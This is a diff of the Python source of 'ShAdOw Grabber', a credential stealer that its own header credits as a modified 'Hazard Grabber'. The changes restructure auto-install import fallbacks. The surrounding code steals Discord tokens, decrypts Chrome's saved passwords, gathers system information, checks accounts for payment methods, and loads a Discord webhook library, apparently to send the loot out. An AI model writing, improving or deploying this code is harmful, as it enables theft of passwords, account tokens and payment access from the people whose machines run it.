@@ -1,4 +1,4 @@
-#CREDITS: 'https://github.com/Rdimo' for base code :) 
+#CREDITS: 'https://github.com/Rdimo' for base code :)
 # Modified version of 'Hazard Grabber' -- Name: ShAdOw Grabber
 
 import os
@@ -8,7 +8,6 @@ import sys
 import base64
 from json import loads, dumps
 import json
-from Crypto.Cipher import AES
 from base64 import b64decode
 import subprocess
 from subprocess import Popen, PIPE
@@ -71,24 +70,42 @@ def install (package):
 try:
 	import win32crypt
 	from dhooks import Webhook, File
-except ImportError or NameError:
+except ImportError or NameError or ModuleNotFoundError:
 	install('pywin32')
-	install('dhooks')
+try:
+    from dhooks import Webhook, File
+except ImportError or NameError or ModuleNotFoundError:
+    install('dhooks')
 try:
 	import shutil
-	import requests
-	import sqlite3
-	import platform as plt
-	from re import findall
-	import getpass
-except ImportError or NameError:
+except ImportError or NameError or ModuleNotFoundError:
 	install('shutil')
-	install('re')
-	install('requests')
-	install('sqlite3')
-	install('platform')
-	install('getpass')
-	import platform as plt
+try:
+    import requests
+except ImportError or NameError or ModuleNotFoundError:
+    install('requests')
+try:
+    from re import findall
+except ImportError or NameError or ModuleNotFoundError:
+    install('re')
+try:
+    import sqlite3
+except ImportError or NameError or ModuleNotFoundError:
+    install('sqlite3')
+try:
+    import getpass
+except ImportError or NameError or ModuleNotFoundError:
+    install('getpass')
+try:
+    import platform as plt
+except ImportError or NameError or ModuleNotFoundError:
+    install('platform')
+    import platform as plt
+try:
+    from Crypto.Cipher import AES
+except ImportError or NameError or ModuleNotFoundError:
+    install('cryptography')
+
 
 sysinfo = f"""
         Operating System: {plt.system()}
@@ -112,7 +129,7 @@ def getuserdata(token):
 		return loads(urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=getheaders(token))).read().decode())
 	except:
 		pass
-		
+
 def gettokens(path):
 	path += "\\Local Storage\\leveldb"
 	tokens = []
@@ -157,7 +174,7 @@ def decrypt_password(password, key):
 
 
 def chrome():
-	f = open(comepleteName, "w") 
+	f = open(comepleteName, "w")
 	key = get_encryption_key()
 	db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
 							"Google", "Chrome", "User Data", "default", "Login Data")
@@ -172,8 +189,8 @@ def chrome():
 		username = row[2]
 		password = decrypt_password(row[3], key)
 		date_created = row[4]
-		date_last_used = row[5]    
-		
+		date_last_used = row[5]
+
 		if username or password:
 			Origin_Url1 =f"\nOrigin URL: {origin_url}\n"
 			f.write(Origin_Url1)
@@ -253,7 +270,7 @@ def getavatar(uid, aid):
 	except:
 		url = url[:-4]
 	return url
- 
+
 def has_payment_methods(token):
 	global nitro_data
 	try:
